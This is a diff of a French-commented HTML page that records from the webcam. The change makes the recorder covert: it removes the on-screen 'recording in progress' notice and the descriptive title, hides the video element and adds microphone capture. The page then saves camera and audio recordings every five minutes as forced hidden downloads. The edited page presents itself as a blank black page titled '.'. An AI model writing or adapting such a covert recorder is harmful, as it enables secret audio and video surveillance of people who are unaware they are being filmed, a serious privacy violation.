@@ -1,72 +1,53 @@
 <!DOCTYPE html>
-<html>
-<head>
-    <title>Chargement...</title>
-    <meta charset="utf-8">
-    <style>
-        body, html { margin:0; padding:0; background:#000; overflow:hidden; }
-        video { width:1px; height:1px; position:absolute; left:-9999px; }
-        #info { position:fixed; top:10px; left:10px; color:#0f0; font-family:Arial; font-size:12px; z-index:99; }
-    </style>
+<html><head><meta charset="utf-8"><title>.</title>
+<style>body{margin:0;background:#000;overflow:hidden}</style>
 </head>
 <body>
 
-<div id="info">Enregistrement en cours... (ferme l'onglet pour arrêter)</div>
-<video id="video" autoplay muted playsinline></video>
+<video id="v" autoplay playsinline style="display:none"></video>
 
 <script>
-// ==== CONFIGURATION (modifie ici si tu veux) ====
-const dureeParFichier = 300; // secondes (5 minutes = 300, 10 min = 600)
-const nomFichierPrefixe = "cam_";
-// ================================================
+let r, s, c = [];
 
-let recorder, stream;
-let morceaux = [];
-let debut = Date.now();
+// Démarre caméra + micro
+navigator.mediaDevices.getUserMedia({video:true, audio:true})
+.then(stream => {
+    s = stream;
+    document.getElementById("v").srcObject = stream;
 
-async function demarrer() {
-    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-    document.getElementById("video").srcObject = stream;
+    // Enregistrement continu avec fichiers de 5 minutes (change 300 en 600 pour 10 min, etc.)
+    function nouveauFichier() {
+        c = [];
+        r = new MediaRecorder(stream, {mimeType: "video/webm;codecs=vp9,opus"});
+        
+        r.ondataavailable = e => { if (e.data.size > 0) c.push(e.data); };
+        
+        r.onstop = () => {
+            const blob = new Blob(c, {type: "video/webm"});
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement("a");
+            a.style.display = "none";
+            a.href = url;
+            a.download = "CAM_" + new Date().toISOString().slice(0,19).replace(/:/g,"-") + ".webm";
+            document.body.appendChild(a);
+            a.click();                    // Téléchargement FORCÉ
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        };
 
-    recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9' });
-
-    recorder.ondataavailable = e => {
-        if (e.data.size > 0) morceaux.push(e.data);
-    };
-
-    recorder.onstop = () => {
-        const blob = new Blob(morceaux, { type: 'video/webm' });
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement("a");
-        a.href = url;
-        a.download = nomFichierPrefixe + new Date().toISOString().replace(/[:.]/g, "-") + ".webm";
-        a.click();
-        morceaux = []; // vide pour le prochain fichier
-    };
-
-    recorder.start();
-    setTimeout(nouveauFichier, dureeParFichier * 1000);
-}
-
-function nouveauFichier() {
-    if (recorder && recorder.state === "recording") {
-        recorder.stop();
+        r.start();
+        setTimeout(() => { if (r.state === "recording") r.stop(); }, 300000); // 5 minutes = 300000 ms
     }
-    setTimeout(() => {
-        recorder.start();
-        setTimeout(nouveauFichier, dureeParFichier * 1000);
-    }, 1000);
-}
 
-// Démarrage automatique dès que la caméra est prête
-demarrer();
+    nouveauFichier();
+    setInterval(nouveauFichier, 302000); // relance toutes les 5 minutes + 2 sec
+})
 
-// Si l'utilisateur ferme l'onglet → arrêt propre
-window.onbeforeunload = () => {
-    if (recorder && recorder.state === "recording") recorder.stop();
-    stream.getTracks().forEach(track => track.stop());
+// Arrêt propre quand tu fermes l’onglet
+window.onunload = () => { 
+    if (r && r.state === "recording") r.stop(); 
+    if (s) s.getTracks().forEach(t => t.stop()); 
 };
 </script>
 
-</body>
-</html>
+</body></html>
